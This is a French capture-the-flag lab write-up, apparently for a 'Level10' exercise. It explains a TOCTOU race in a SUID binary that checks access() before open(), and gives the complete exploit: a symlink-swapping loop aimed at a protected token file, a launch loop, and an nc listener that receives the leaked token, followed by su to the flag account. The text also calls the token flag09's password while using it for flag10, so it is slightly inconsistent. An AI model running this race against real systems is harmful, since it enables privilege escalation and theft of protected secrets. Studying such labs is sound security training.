# Level10 — Race Condition TOCTOU

## Fichiers fournis

```sh
ls -la ~
# -rwsr-s---  1 flag10 level10 ... level10   (binaire SUID)
# -rw-------  1 flag10 flag10  ... token     (token illisible)
```

Usage du binaire :
```sh
./level10 file host
# envoie file vers host:6969 si tu as accès au fichier
```

## Reconnaissance

```sh
./level10 ~/token 192.168.56.1
# You don't have access to token
```

Le binaire appelle `access()` pour vérifier les permissions, puis `open()` pour lire le fichier. Ces deux appels sont séparés dans le temps — c'est la faille.

## Vulnérabilité — TOCTOU (Time Of Check Time Of Use)

`access()` vérifie les permissions à un instant T. `open()` ouvre le fichier à un instant T+ε. Si on remplace le fichier entre les deux, `open()` lit un fichier différent de celui vérifié.

Attaque : faire passer `access()` sur un fichier légitime, puis switcher vers un symlink vers `token` avant que `open()` s'exécute.

## Exploitation

**Setup :**
```sh
echo "test" > /tmp/legit
```

**Terminal 1 (VM) — écoute réseau :**
```sh
# depuis la machine locale
nc -lk 6969
```

**Terminal 2 (VM) — boucle de lancement :**
```sh
while true; do ./level10 /tmp/myfile 192.168.56.1; done
```

**Terminal 3 (VM) — boucle de switch :**
```sh
while true; do ln -sf /tmp/legit /tmp/myfile; ln -sf ~/token /tmp/myfile; done
```

Quand la race est gagnée, `nc` reçoit le contenu de `token` — c'est le password de `flag09`.

```sh
su flag10   # password = contenu de token
getflag
```

## Token

Voir `../flag`.
